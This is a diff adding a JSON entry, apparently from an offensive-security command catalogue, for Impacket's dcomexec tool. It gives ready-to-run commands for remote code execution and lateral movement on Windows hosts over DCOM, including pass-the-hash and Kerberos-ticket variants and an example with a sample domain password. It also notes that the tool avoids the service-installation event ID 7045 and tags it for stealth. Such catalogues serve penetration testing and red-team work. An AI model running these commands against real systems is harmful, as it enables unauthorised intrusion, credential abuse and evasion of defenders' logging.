@@ -1,0 +1,21 @@
+{
+  "id": "impacket-dcomexec",
+  "name": "Impacket dcomexec.py",
+  "command": "impacket-dcomexec '<domain>/<user>:<password>@<target>'",
+  "description": "Execute commands over DCOM (MMC20.Application / ShellWindows / ShellBrowserWindow) without dropping a service. Quieter than psexec/smbexec, no service installation event ID 7045.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["rpc", "smb"],
+  "tags": ["impacket", "dcomexec", "lateral-movement", "dcom", "stealth"],
+  "variations": [
+    { "label": "Pass-the-Hash", "requires": "hash", "command": "impacket-dcomexec -hashes :<nt-hash> '<domain>/<user>@<target>'" },
+    { "label": "ShellWindows Object", "requires": "password", "command": "impacket-dcomexec -object ShellWindows '<domain>/<user>:<password>@<target>'" },
+    { "label": "Kerberos", "requires": "ticket", "command": "impacket-dcomexec -k -no-pass '<domain>/<user>@<target>'" }
+  ],
+  "references": [
+    { "title": "Impacket dcomexec", "url": "https://github.com/fortra/impacket/blob/master/examples/dcomexec.py" }
+  ],
+  "examples": [
+    "impacket-dcomexec corp.local/jdoe:'Password123!'@10.10.10.10"
+  ]
+}
